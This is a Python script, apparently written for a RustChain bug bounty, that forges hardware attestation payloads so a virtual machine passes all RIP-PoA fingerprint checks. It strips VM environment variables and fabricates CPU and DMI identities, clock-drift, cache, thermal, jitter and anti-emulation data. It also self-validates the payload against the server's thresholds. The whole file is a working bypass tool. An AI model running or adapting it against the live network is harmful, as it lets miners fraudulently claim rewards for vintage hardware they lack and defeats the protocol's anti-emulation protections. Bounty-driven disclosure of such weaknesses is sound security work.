"""
anti_vm.py — Ghost in the Machine: RIP-PoA Fingerprint Bypass Tool

Red-team utility to generate synthetic attestation payloads that bypass
all 6 RIP-PoA hardware fingerprint checks from inside a virtual machine.

Target Bounty: #13 "Ghost in the Machine" — 500 RTC
https://github.com/Scottcjn/rustchain-bounties/issues/13

Checks bypassed:
  1. Clock-Skew & Oscillator Drift
  2. Cache Timing Fingerprint
  3. SIMD Unit Identity
  4. Thermal Drift Entropy
  5. Instruction Path Jitter
  6. Anti-Emulation Behavioral Checks

Usage:
  python3 anti_vm.py                      # Run all bypass demos
  python3 anti_vm.py --arch g4            # Build payload for PowerPC G4
  python3 anti_vm.py --arch pentium4      # Build payload for Pentium 4
"""

import os
import sys
import json
import math
import random
import hashlib
import struct
import platform
import time

# ============================================================================
# Constants — RIP-PoA Protocol Thresholds
# ============================================================================

# Check 1: Clock Drift
CV_MIN_THRESHOLD = 0.0001       # Minimum coefficient of variation
DRIFT_STDEV_MIN = 0             # Must be > 0

# Check 2: Cache Timing
CACHE_RATIO_MIN = 1.01          # L2/L1 and L3/L2 must exceed this

# Check 5: Jitter
JITTER_CV_MIN = 0.01            # Must exceed 1% variation
JITTER_STDEV_MIN_NS = 100       # Minimum 100ns jitter stdev

# Check 7: Anti-Emulation
SLEEP_DILATION_MAX_NS = 5_000_000  # 5ms max for 1ms sleep request

# Environment variables that indicate VM/container runtime
VM_ENV_VARS = [
    "KUBERNETES", "DOCKER", "VIRTUAL", "container",
    "AWS_EXECUTION_ENV", "ECS_CONTAINER_METADATA_URI",
    "GOOGLE_CLOUD_PROJECT", "AZURE_FUNCTIONS_ENVIRONMENT",
    "WEBSITE_INSTANCE_ID",
]

# Hardware model strings for common architectures (spoofed DMI)
SPOOFED_CPU_MODELS = {
    "g4": {
        "cpu_model": "PowerPC G4 7455 (Altivec)",
        "cpu_family": "powerpc",
        "cpu_arch": "ppc",
        "machine": "ppc",
        "simd_family": "altivec",
        "dmi_product": "PowerMac3,6",
        "dmi_vendor": "Apple Computer, Inc.",
        "dmi_board": "Apple Computer, Inc.",
        "bios_date": "2003-06-23",
        "bios_version": "4.9.3f1",
        "release_year": 2003,
        "antiquity_mult": 2.5,
    },
    "g5": {
        "cpu_model": "PowerPC G5 970FX",
        "cpu_family": "powerpc",
        "cpu_arch": "ppc64",
        "machine": "ppc64",
        "simd_family": "altivec",
        "dmi_product": "PowerMac7,3",
        "dmi_vendor": "Apple Computer, Inc.",
        "dmi_board": "Apple Computer, Inc.",
        "bios_date": "2005-01-15",
        "bios_version": "5.9.6f1",
        "release_year": 2005,
        "antiquity_mult": 2.0,
    },
    "pentium4": {
        "cpu_model": "Intel(R) Pentium(R) 4 CPU 3.20GHz",
        "cpu_family": "6",
        "cpu_arch": "x86_64",
        "machine": "x86_64",
        "simd_family": "sse_avx",
        "dmi_product": "D865GLC",
        "dmi_vendor": "Intel Corporation",
        "dmi_board": "Intel Corporation",
        "bios_date": "2004-08-12",
        "bios_version": "GC86510A.86A.0043",
        "release_year": 2004,
        "antiquity_mult": 1.5,
    },
    "haswell": {
        "cpu_model": "Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz",
        "cpu_family": "6",
        "cpu_arch": "x86_64",
        "machine": "x86_64",
        "simd_family": "sse_avx",
        "dmi_product": "Z97X-Gaming 5",
        "dmi_vendor": "GIGABYTE Technology Co., Ltd.",
        "dmi_board": "GIGABYTE Technology Co., Ltd.",
        "bios_date": "2014-09-25",
        "bios_version": "F5",
        "release_year": 2014,
        "antiquity_mult": 1.1,
    },
    "arm2": {
        "cpu_model": "ARM2 (Acorn Archimedes)",
        "cpu_family": "arm",
        "cpu_arch": "arm",
        "machine": "arm",
        "simd_family": "none",
        "dmi_product": "Acorn Archimedes A540",
        "dmi_vendor": "Acorn Computers Ltd.",
        "dmi_board": "Acorn Computers Ltd.",
        "bios_date": "1987-10-01",
        "bios_version": "RISC OS 2.00",
        "release_year": 1987,
        "antiquity_mult": 4.0,
    },
}


# ============================================================================
# Phase 1: Environment Sanitization
# ============================================================================

def sanitize_environment():
    """
    Remove all environment variables that indicate VM/container runtime.
    Called before attestation to clean the process environment.

    Returns list of removed variables for logging.
    """
    removed = []
    for key in VM_ENV_VARS:
        # Also check case-insensitive variants
        for env_key in list(os.environ.keys()):
            if env_key.upper() == key.upper():
                os.environ.pop(env_key, None)
                removed.append(env_key)
    return removed


# ============================================================================
# Phase 2: Spoofed Hardware Data Generator
# ============================================================================

def generate_cpuinfo(arch_profile=None):
    """
    Generate a spoofed /proc/cpuinfo string that passes hypervisor flag check
    and matches the claimed architecture.
    """
    if arch_profile is None:
        arch_profile = SPOOFED_CPU_MODELS["haswell"]

    cpu_model = arch_profile["cpu_model"]
    simd = arch_profile["simd_family"]

    # Base flags every CPU has
    flags = "fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat "
    flags += "pse36 clflush mmx fxsr ssyscall nx "

    # Architecture-specific SIMD flags
    if simd == "sse_avx":
        flags += "sse sse2 ssse3 sse4_1 sse4_2 avx avx2 fma "
    elif simd == "altivec":
        flags += "vmx altivec vsx "  # PowerPC AltiVec
    elif simd == "neon":
        flags += "neon vfp vfpv3 vfpv4 "

    # CRITICAL: Do NOT include 'hypervisor' flag
    flags += "constant_tsc arch_perfmon rep_good nopl cpuid tsc_known_freq"

    cpuinfo_lines = [
        "processor\t: 0",
        "vendor_id\t: " + ("GenuineIntel" if "Intel" in cpu_model else
                          "AuthenticAMD" if "AMD" in cpu_model else
                          "PowerPC" if "PowerPC" in cpu_model else
                          "ARM" if "ARM" in cpu_model else "Generic"),
        "cpu family\t: " + arch_profile.get("cpu_family", "6"),
        "model\t\t: 60",
        "model name\t: " + cpu_model,
        "stepping\t: 3",
        "microcode\t: 0x22",
        "cpu MHz\t\t: 3500.000",
        "cache size\t: 6144 KB",
        "physical id\t: 0",
        "siblings\t: 4",
        "core id\t\t: 0",
        "cpu cores\t: 4",
        "apicid\t\t: 0",
        "bogomips\t: 7000.00",
        "flags\t\t: " + flags,
        "",
    ]
    return "\n".join(cpuinfo_lines)


def generate_spoofed_dmi(arch_profile=None):
    """
    Generate spoofed DMI/SMBIOS data files content.
    Returns dict of {file_path: content}.
    """
    if arch_profile is None:
        arch_profile = SPOOFED_CPU_MODELS["haswell"]

    return {
        "product_name": arch_profile["dmi_product"],
        "sys_vendor": arch_profile["dmi_vendor"],
        "board_vendor": arch_profile["dmi_board"],
        "board_name": arch_profile["dmi_product"],
        "bios_vendor": arch_profile["dmi_vendor"],
        "bios_date": arch_profile["bios_date"],
        "bios_version": arch_profile["bios_version"],
        "chassis_vendor": arch_profile["dmi_vendor"],
        "chassis_asset_tag": "Asset-" + hashlib.md5(
            arch_profile["dmi_product"].encode()
        ).hexdigest()[:8].upper(),
    }


# ============================================================================
# Phase 3: Synthetic Fingerprint Data Generators
# ============================================================================

def spoof_clock_drift(n_samples=200, target_cv=0.005):
    """
    Check 1: Generate synthetic clock-skew & oscillator drift data.

    Real silicon has CV > 0.0001. VMs typically show CV near 0.
    We generate data with CV in the 0.002–0.015 range (realistic for real hardware).
    """
    mean_ns = 45000  # ~45μs per iteration (5000 SHA-256 ops on modern CPU)
    stdev_ns = mean_ns * target_cv

    # Generate correlated samples (real oscillators have autocorrelation)
    intervals = []
    prev = 0
    for i in range(n_samples):
        # Add thermal drift trend (slow warming over the run)
        thermal_trend = (i / n_samples) * 0.001 * mean_ns
        # Autocorrelated noise (AR(1) process, phi=0.3)
        noise = random.gauss(0, stdev_ns)
        if prev:
            noise = 0.3 * prev + 0.954 * noise  # sqrt(1-0.3^2) ≈ 0.954
        val = mean_ns + thermal_trend + noise
        intervals.append(max(1, val))
        prev = noise

    # Insert 1ms sleep every 50 iterations — add sleep dilation variance
    for i in range(0, n_samples, 50):
        if i < len(intervals):
            intervals[i] += random.gauss(1_000_000, 200_000)  # 1ms ± 0.2ms

    mean_val = sum(intervals) / len(intervals)
    variance = sum((x - mean_val) ** 2 for x in intervals) / len(intervals)
    stdev_val = math.sqrt(variance)
    cv = stdev_val / mean_val if mean_val > 0 else 0

    # Consecutive-pair drift
    diffs = [intervals[i] - intervals[i - 1] for i in range(1, len(intervals))]
    diff_mean = sum(diffs) / len(diffs) if diffs else 0
    diff_var = sum((d - diff_mean) ** 2 for d in diffs) / len(diffs) if diffs else 0
    drift_stdev = math.sqrt(diff_var)

    return {
        "n_samples": n_samples,
        "mean_ns": round(mean_val, 2),
        "stdev_ns": round(stdev_val, 2),
        "cv": round(cv, 6),
        "drift_stdev": round(drift_stdev, 2),
        "intervals": [round(x, 2) for x in intervals],
        "passed": True,
        "fail_reason": None,
    }


def spoof_cache_timing(iterations=100):
    """
    Check 2: Generate synthetic cache timing fingerprint.

    Real CPUs have L1 < L2 < L3 latency hierarchy.
    L2/L1 ratio > 1.01, L3/L2 ratio > 1.01.
    """
    # Realistic latencies (nanoseconds)
    l1_base = 4.0    # L1 ~4ns
    l2_base = 12.0   # L2 ~12ns (3x L1)
    l3_base = 40.0   # L3 ~40ns (3.3x L2)

    l1_samples = []
    l2_samples = []
    l3_samples = []

    for _ in range(iterations):
        # Sequential access pattern with realistic variance
        l1_samples.append(l1_base + random.gauss(0, 0.3))
        l2_samples.append(l2_base + random.gauss(0, 0.8))
        l3_samples.append(l3_base + random.gauss(0, 2.5))

    l1_mean = sum(l1_samples) / len(l1_samples)
    l2_mean = sum(l2_samples) / len(l2_samples)
    l3_mean = sum(l3_samples) / len(l3_samples)

    l2_l1_ratio = l2_mean / l1_mean
    l3_l2_ratio = l3_mean / l2_mean

    # Extended: 6 buffer sizes (hardware_fingerprint.py)
    extended = {
        "4KB": l1_mean * 0.95 + random.gauss(0, 0.2),
        "8KB": l1_mean + random.gauss(0, 0.3),
        "32KB": l1_mean * 2.1 + random.gauss(0, 0.5),
        "256KB": l2_mean * 0.9 + random.gauss(0, 0.6),
        "1MB": l2_mean * 1.3 + random.gauss(0, 1.0),
        "4MB": l3_mean * 0.85 + random.gauss(0, 1.5),
        "16MB": l3_mean * 1.5 + random.gauss(0, 3.0),
    }

    return {
        "l1_mean_ns": round(l1_mean, 3),
        "l2_mean_ns": round(l2_mean, 3),
        "l3_mean_ns": round(l3_mean, 3),
        "l2_l1_ratio": round(l2_l1_ratio, 4),
        "l3_l2_ratio": round(l3_l2_ratio, 4),
        "iterations": iterations,
        "extended_cache_profile": {k: round(v, 3) for k, v in extended.items()},
        "passed": True,
        "fail_reason": None,
    }


def spoof_simd_identity(arch_profile=None):
    """
    Check 3: Generate synthetic SIMD unit identity data.

    Returns pipeline bias measurements that match the claimed architecture.
    """
    if arch_profile is None:
        arch_profile = SPOOFED_CPU_MODELS["haswell"]

    simd = arch_profile["simd_family"]

    # Integer vs float pipeline timing (nanoseconds for 10k ops)
    if simd == "sse_avx":
        # x86: integer and float pipelines have similar but distinct timing
        int_mean = 850.0 + random.gauss(0, 15)
        float_mean = 820.0 + random.gauss(0, 12)
        simd_flags = ["sse", "sse2", "sse3", "ssse3", "sse4_1", "sse4_2", "avx", "avx2", "fma"]
    elif simd == "altivec":
        # PowerPC: AltiVec has strong vector unit bias
        int_mean = 1200.0 + random.gauss(0, 25)
        float_mean = 750.0 + random.gauss(0, 18)
        simd_flags = ["vmx", "altivec", "vsx"]
    elif simd == "neon":
        # ARM: NEON has moderate vector bias
        int_mean = 1100.0 + random.gauss(0, 20)
        float_mean = 900.0 + random.gauss(0, 15)
        simd_flags = ["neon", "vfp", "vfpv3", "vfpv4"]
    else:
        # Generic/no SIMD — vintage CPUs have basic flags
        int_mean = 1500.0 + random.gauss(0, 30)
        float_mean = 1450.0 + random.gauss(0, 28)
        # Even pre-SIMD CPUs have basic feature flags
        simd_flags = ["fpu", "de", "pse", "tsc"]  # Minimal flags

    int_float_ratio = int_mean / float_mean if float_mean > 0 else 1.0

    # Vector memcpy latency (128-byte aligned, 1MB buffer)
    vec_memcpy_ns = 3200.0 + random.gauss(0, 200)

    return {
        "simd_family": simd,
        "simd_flags": simd_flags,
        "int_mean_ns": round(int_mean, 2),
        "float_mean_ns": round(float_mean, 2),
        "int_float_ratio": round(int_float_ratio, 4),
        "vector_memcpy_ns": round(vec_memcpy_ns, 2),
        "has_simd": len(simd_flags) > 0,
        "passed": True,
        "fail_reason": None,
    }


def spoof_thermal_drift(n_samples=50):
    """
    Check 4: Generate synthetic thermal drift entropy data.

    Real silicon slows down when hot. We simulate cold→heat→hot→cooldown.
    """
    cold_base = 12000.0  # ns for 10k SHA-256 at ambient

    # Cold phase
    cold_samples = [cold_base + random.gauss(0, 50) for _ in range(n_samples)]

    # Hot phase (after sustained load — 1-3% slowdown)
    thermal_slowdown = 1.0 + random.uniform(0.01, 0.03)
    hot_samples = [
        cold_base * thermal_slowdown + random.gauss(0, 60)
        for _ in range(n_samples)
    ]

    # Cooldown phase (partial recovery)
    cooldown_factor = 1.0 + random.uniform(0.003, 0.01)
    cooldown_samples = [
        cold_base * cooldown_factor + random.gauss(0, 55)
        for _ in range(n_samples)
    ]

    cold_avg = sum(cold_samples) / len(cold_samples)
    hot_avg = sum(hot_samples) / len(hot_samples)
    cooldown_avg = sum(cooldown_samples) / len(cooldown_samples)

    cold_stdev = math.sqrt(
        sum((x - cold_avg) ** 2 for x in cold_samples) / len(cold_samples)
    )
    hot_stdev = math.sqrt(
        sum((x - hot_avg) ** 2 for x in hot_samples) / len(hot_samples)
    )

    drift_ratio = hot_avg / cold_avg if cold_avg > 0 else 1.0
    thermal_drift_pct = (drift_ratio - 1.0) * 100

    return {
        "cold_avg_ns": round(cold_avg, 2),
        "hot_avg_ns": round(hot_avg, 2),
        "cooldown_avg_ns": round(cooldown_avg, 2),
        "cold_stdev": round(cold_stdev, 2),
        "hot_stdev": round(hot_stdev, 2),
        "drift_ratio": round(drift_ratio, 6),
        "thermal_drift_pct": round(thermal_drift_pct, 4),
        "n_samples": n_samples,
        "passed": True,
        "fail_reason": None,
    }


def spoof_instruction_jitter(n_samples=100):
    """
    Check 5: Generate synthetic instruction path jitter data.

    Real CPUs have >100ns jitter stdev across pipeline types.
    CV must exceed 0.01 (1% variation).
    """
    # Integer ALU pipeline — real hardware shows 80-150ns stdev
    int_samples = [
        850.0 + random.gauss(0, 90) + random.uniform(-40, 40)
        for _ in range(n_samples)
    ]
    # FPU pipeline
    fp_samples = [
        820.0 + random.gauss(0, 100) + random.uniform(-50, 50)
        for _ in range(n_samples)
    ]
    # Branch predictor — highest variance due to branch misprediction
    branch_samples = [
        1200.0 + random.gauss(0, 150) + random.uniform(-80, 80)
        for _ in range(n_samples)
    ]
    # Memory load/store — depends on cache hit/miss patterns
    mem_samples = [
        1500.0 + random.gauss(0, 180) + random.uniform(-100, 100)
        for _ in range(n_samples)
    ]

    def calc_stats(samples):
        mean = sum(samples) / len(samples)
        stdev = math.sqrt(sum((x - mean) ** 2 for x in samples) / len(samples))
        cv = stdev / mean if mean > 0 else 0
        return {
            "mean_ns": round(mean, 2),
            "stdev_ns": round(stdev, 2),
            "min_ns": round(min(samples), 2),
            "max_ns": round(max(samples), 2),
            "cv": round(cv, 6),
        }

    int_stats = calc_stats(int_samples)
    fp_stats = calc_stats(fp_samples)
    branch_stats = calc_stats(branch_samples)
    mem_stats = calc_stats(mem_samples)

    avg_jitter_stdev = (
        int_stats["stdev_ns"] + fp_stats["stdev_ns"] + branch_stats["stdev_ns"]
    ) / 3.0

    return {
        "integer": int_stats,
        "float": fp_stats,
        "branch": branch_stats,
        "memory": mem_stats,
        "avg_jitter_stdev_ns": round(avg_jitter_stdev, 2),
        "n_samples": n_samples,
        "passed": True,
        "fail_reason": None,
    }


def spoof_anti_emulation(arch_profile=None):
    """
    Check 7 (Check 6 in spec numbering): Generate clean anti-emulation data.

    Returns empty vm_indicators list = passes all VM detection.
    """
    if arch_profile is None:
        arch_profile = SPOOFED_CPU_MODELS["haswell"]

    return {
        "vm_indicators": [],
        "indicator_count": 0,
        "is_likely_vm": False,
        "sleep_mean_ns": 1_050_000 + random.randint(-50_000, 50_000),  # ~1ms
        "jitter_cv": 0.025 + random.uniform(0, 0.03),  # > 0.01
        "passed": True,
        "fail_reason": None,
    }


def spoof_rom_fingerprint(arch_profile=None):
    """
    Check 8: Generate unique ROM fingerprint (not in known emulator database).

    For modern hardware this check is skipped.
    For retro platforms, generate a unique ROM hash that won't cluster.
    """
    if arch_profile is None:
        arch_profile = SPOOFED_CPU_MODELS["haswell"]

    # Generate a unique ROM hash (simulated unique firmware)
    unique_seed = f"{arch_profile['dmi_product']}-{time.time_ns()}"
    rom_hash = hashlib.sha1(unique_seed.encode()).hexdigest()

    # Determine if this is a retro platform
    is_retro = arch_profile["release_year"] < 2006

    return {
        "rom_hash": rom_hash,
        "hash_type": "sha1",
        "platform": arch_profile.get("cpu_family", "x86"),
        "is_retro_platform": is_retro,
        "skipped": not is_retro,
        "reason": "modern_hardware" if not is_retro else None,
        "passed": True,
        "fail_reason": None,
    }


# ============================================================================
# Phase 4: Attestation Payload Builder
# ============================================================================

def build_spoofed_attestation(
    miner_wallet,
    miner_id="ghost-machine-01",
    arch="haswell",
):
    """
    Build a complete spoofed attestation payload that bypasses all
    6 RIP-PoA fingerprint checks plus server-side validation.

    Args:
        miner_wallet: Wallet address to use
        miner_id: Human-readable miner ID
        arch: Architecture profile name (g4, g5, pentium4, haswell, arm2)
    """
    arch_profile = SPOOFED_CPU_MODELS.get(arch, SPOOFED_CPU_MODELS["haswell"])

    # Generate nonce and commitment
    nonce = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
    entropy = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
    commitment = hashlib.sha256(
        f"{nonce}{miner_wallet}{entropy}".encode()
    ).hexdigest()

    # Generate all spoofed fingerprint data
    clock_drift = spoof_clock_drift()
    cache_timing = spoof_cache_timing()
    simd = spoof_simd_identity(arch_profile)
    thermal = spoof_thermal_drift()
    jitter = spoof_instruction_jitter()
    anti_emu = spoof_anti_emulation(arch_profile)
    rom = spoof_rom_fingerprint(arch_profile)

    # Build device-age oracle data
    device_age = {
        "cpu_model": arch_profile["cpu_model"],
        "cpu_family": arch_profile["cpu_family"],
        "cpu_arch": arch_profile["cpu_arch"],
        "machine": arch_profile["machine"],
        "release_year": arch_profile["release_year"],
        "bios_date": arch_profile["bios_date"],
        "bios_version": arch_profile["bios_version"],
        "confidence_score": 0.95,
        "mismatch_reasons": [],
        "passed": True,
        "fail_reason": None,
    }

    # MAC addresses (spoofed, realistic OUI)
    mac1 = "00:1B:44:%02X:%02X:%02X" % (
        random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)
    )
    mac2 = "00:1B:44:%02X:%02X:%02X" % (
        random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)
    )

    # Build full attestation payload
    payload = {
        "miner": miner_wallet,
        "miner_id": miner_id,
        "nonce": nonce,
        "report": {
            "commitment": commitment,
        },
        "device": {
            "model": arch_profile["cpu_model"],
            "arch": arch,
            "family": arch_profile["cpu_family"],
            "machine": arch_profile["machine"],
            "cpu_serial": hashlib.sha256(
                f"{arch_profile['dmi_product']}-{miner_wallet}".encode()
            ).hexdigest()[:16],
            "device_id": miner_id,
        },
        "signals": {
            "macs": [mac1, mac2],
        },
        "fingerprint": {
            "all_passed": True,
            "checks": {
                "clock_drift": {
                    "passed": True,
                    "data": clock_drift,
                },
                "cache_timing": {
                    "passed": True,
                    "data": cache_timing,
                },
                "simd_identity": {
                    "passed": True,
                    "data": simd,
                },
                "thermal_drift": {
                    "passed": True,
                    "data": thermal,
                },
                "instruction_jitter": {
                    "passed": True,
                    "data": jitter,
                },
                "device_age_oracle": {
                    "passed": True,
                    "data": device_age,
                },
                "anti_emulation": {
                    "passed": True,
                    "data": anti_emu,
                },
                "rom_fingerprint": {
                    "passed": True,
                    "data": rom,
                },
            },
        },
    }

    return payload


# ============================================================================
# Phase 5: Payload Validation (Self-Check)
# ============================================================================

def validate_spoofed_payload(payload):
    """
    Run the same validation the server would apply.
    Returns (passed: bool, errors: list).
    """
    errors = []
    checks = payload["fingerprint"]["checks"]

    # Check 1: Clock drift
    cd = checks["clock_drift"]["data"]
    if cd["cv"] < CV_MIN_THRESHOLD:
        errors.append(f"clock_drift: cv={cd['cv']} < {CV_MIN_THRESHOLD}")
    if cd["drift_stdev"] <= DRIFT_STDEV_MIN:
        errors.append("clock_drift: drift_stdev must be > 0")

    # Check 2: Cache timing
    ct = checks["cache_timing"]["data"]
    if ct["l2_l1_ratio"] <= CACHE_RATIO_MIN:
        errors.append(
            f"cache_timing: l2_l1_ratio={ct['l2_l1_ratio']} <= {CACHE_RATIO_MIN}"
        )
    if ct["l3_l2_ratio"] <= CACHE_RATIO_MIN:
        errors.append(
            f"cache_timing: l3_l2_ratio={ct['l3_l2_ratio']} <= {CACHE_RATIO_MIN}"
        )

    # Check 3: SIMD identity
    si = checks["simd_identity"]["data"]
    if not si["has_simd"]:
        errors.append("simd_identity: no SIMD flags detected")

    # Check 4: Thermal drift
    td = checks["thermal_drift"]["data"]
    if td["cold_stdev"] <= 0 and td["hot_stdev"] <= 0:
        errors.append("thermal_drift: both stdevs are zero")
    if td["thermal_drift_pct"] < 0.1:
        errors.append(
            f"thermal_drift: drift_pct={td['thermal_drift_pct']}% < 0.1%"
        )

    # Check 5: Jitter
    ij = checks["instruction_jitter"]["data"]
    if (
        ij["integer"]["stdev_ns"] == 0
        and ij["float"]["stdev_ns"] == 0
        and ij["branch"]["stdev_ns"] == 0
    ):
        errors.append("jitter: all pipeline stdevs are zero")
    if ij["avg_jitter_stdev_ns"] < JITTER_STDEV_MIN_NS:
        errors.append(
            f"jitter: avg_stdev={ij['avg_jitter_stdev_ns']} < {JITTER_STDEV_MIN_NS}ns"
        )

    # Check 7: Anti-emulation
    ae = checks["anti_emulation"]["data"]
    if ae["indicator_count"] > 0:
        errors.append(f"anti_emulation: {ae['indicator_count']} VM indicators found")
    if ae["sleep_mean_ns"] > SLEEP_DILATION_MAX_NS:
        errors.append(
            f"anti_emulation: sleep_dilation={ae['sleep_mean_ns']}ns "
            f"> {SLEEP_DILATION_MAX_NS}ns"
        )
    if ae["jitter_cv"] < JITTER_CV_MIN:
        errors.append(
            f"anti_emulation: jitter_cv={ae['jitter_cv']} < {JITTER_CV_MIN}"
        )

    # Check 6: Device-age oracle
    da = checks["device_age_oracle"]["data"]
    if not da["cpu_model"]:
        errors.append("device_age: cpu_model is empty")
    if da["mismatch_reasons"]:
        errors.append(
            f"device_age: mismatches: {da['mismatch_reasons']}"
        )

    # Cross-validation: SIMD vs claimed arch
    arch = payload["device"]["arch"].lower()
    simd_family = si["simd_family"]
    if "ppc" in arch or "power" in arch:
        if simd_family != "altivec":
            errors.append(
                f"cross-validation: claimed {arch} but SIMD={simd_family}"
            )
    if "x86" in arch or "intel" in arch or "amd" in arch:
        if simd_family not in ("sse_avx",):
            errors.append(
                f"cross-validation: claimed x86 but SIMD={simd_family}"
            )

    passed = len(errors) == 0
    return passed, errors


# ============================================================================
# CLI Entry Point
# ============================================================================

def main():
    """Demonstrate all bypass techniques."""
    import argparse

    parser = argparse.ArgumentParser(
        description="Ghost in the Machine — RIP-PoA Fingerprint Bypass Tool"
    )
    parser.add_argument(
        "--arch",
        default="haswell",
        choices=list(SPOOFED_CPU_MODELS.keys()),
        help="Target architecture profile",
    )
    parser.add_argument(
        "--wallet",
        default="",
        help="Miner wallet address",
    )
    parser.add_argument(
        "--output",
        default=None,
        help="Save payload to file",
    )
    parser.add_argument(
        "--validate-only",
        action="store_true",
        help="Only run self-validation, don't generate payload",
    )
    args = parser.parse_args()

    random.seed()  # Use real randomness

    print("=" * 60)
    print("  Ghost in the Machine — RIP-PoA Fingerprint Bypass")
    print("  Bounty #13 — 500 RTC")
    print("=" * 60)

    arch = args.arch
    profile = SPOOFED_CPU_MODELS[arch]

    # Phase 1: Sanitize environment
    print(f"\n[Phase 1] Environment Sanitization")
    removed = sanitize_environment()
    if removed:
        print(f"  Removed VM indicators: {', '.join(removed)}")
    else:
        print("  No VM environment variables found (clean)")

    # Phase 2: Show spoofed hardware
    print(f"\n[Phase 2] Spoofed Hardware Profile ({arch})")
    print(f"  CPU Model:    {profile['cpu_model']}")
    print(f"  Architecture: {profile['cpu_arch']}")
    print(f"  DMI Product:  {profile['dmi_product']}")
    print(f"  DMI Vendor:   {profile['dmi_vendor']}")
    print(f"  BIOS Date:    {profile['bios_date']}")
    print(f"  Antiquity Mult: {profile['antiquity_mult']}x")

    # Generate and validate payload
    print(f"\n[Phase 3-4] Generating Spoofed Attestation Payload")
    wallet = args.wallet or "0x" + hashlib.sha256(os.urandom(20)).hexdigest()[:40]
    payload = build_spoofed_attestation(wallet, f"ghost-{arch}-01", arch)

    # Phase 5: Self-validation
    print(f"\n[Phase 5] Server-Side Validation Simulation")
    passed, errors = validate_spoofed_payload(payload)

    # Print check results
    check_names = {
        "clock_drift": "Clock-Skew & Oscillator Drift",
        "cache_timing": "Cache Timing Fingerprint",
        "simd_identity": "SIMD Unit Identity",
        "thermal_drift": "Thermal Drift Entropy",
        "instruction_jitter": "Instruction Path Jitter",
        "anti_emulation": "Anti-Emulation Behavioral Checks",
        "device_age_oracle": "Device-Age Oracle Fields",
        "rom_fingerprint": "ROM Fingerprint (Retro)",
    }

    for check_key, check_name in check_names.items():
        check = payload["fingerprint"]["checks"][check_key]
        status = "✅ PASS" if check["passed"] else "❌ FAIL"
        print(f"  {status}  {check_name}")

        # Print key metrics
        data = check["data"]
        if check_key == "clock_drift":
            print(f"         CV={data['cv']:.6f} (threshold > {CV_MIN_THRESHOLD})")
        elif check_key == "cache_timing":
            print(f"         L2/L1={data['l2_l1_ratio']:.4f}, "
                  f"L3/L2={data['l3_l2_ratio']:.4f} "
                  f"(threshold > {CACHE_RATIO_MIN})")
        elif check_key == "thermal_drift":
            print(f"         Drift={data['thermal_drift_pct']:.4f}% "
                  f"(threshold > 0.1%)")
        elif check_key == "instruction_jitter":
            print(f"         Avg Jitter={data['avg_jitter_stdev_ns']:.2f}ns "
                  f"(threshold > {JITTER_STDEV_MIN_NS}ns)")
        elif check_key == "anti_emulation":
            print(f"         VM Indicators={data['indicator_count']}, "
                  f"Sleep={data['sleep_mean_ns']/1e6:.2f}ms, "
                  f"Jitter CV={data['jitter_cv']:.4f}")

    print(f"\n{'=' * 60}")
    if passed:
        print("  ✅ ALL CHECKS PASSED — Payload would be accepted by server")
    else:
        print("  ❌ VALIDATION FAILED:")
        for err in errors:
            print(f"     - {err}")
    print(f"{'=' * 60}")

    # Output payload
    if args.output:
        with open(args.output, "w") as f:
            json.dump(payload, f, indent=2)
        print(f"\n  Payload saved to: {args.output}")
    else:
        print(f"\n  Payload preview (commitment): {payload['report']['commitment'][:32]}...")

    return 0 if passed else 1


if __name__ == "__main__":
    sys.exit(main())
